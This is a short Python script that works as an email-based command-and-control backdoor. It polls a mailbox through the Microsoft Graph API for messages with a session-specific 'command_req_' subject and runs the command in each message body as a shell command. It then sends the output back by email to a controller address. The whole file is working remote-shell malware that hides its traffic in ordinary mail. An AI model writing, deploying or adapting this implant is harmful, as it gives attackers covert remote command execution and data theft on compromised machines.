import json
import os
import subprocess
import time
import uuid
import requests

base = 'https://graph.microsoft.com/v1.0/users/' + os.environ['MAILBOX']
headers = {'Authorization': 'Bearer ' + os.environ['GRAPH_TOKEN']}
session_id = str(uuid.uuid4())
while True:
    messages = requests.get(base + '/messages', headers=headers,
        params={'$filter': "subject eq 'command_req_" + session_id + "'"}).json()['value']
    for message in messages:
        task = json.loads(message['body']['content'])
        if task['command_type'] != 'cmd':
            continue
        output = subprocess.check_output(task['command_data']['command'], shell=True, timeout=30).decode()
        response = {'command_type': task['command_type'], 'request_id': task['request_id'],
                    'success': True, 'result': output, 'error': None}
        requests.post(base + '/sendMail', headers=headers, json={'message': {
            'subject': 'command_res_' + session_id,
            'body': {'contentType': 'Text', 'content': json.dumps(response)},
            'toRecipients': [{'emailAddress': {'address': os.environ['CONTROLLER']}}]}})
    time.sleep(10)
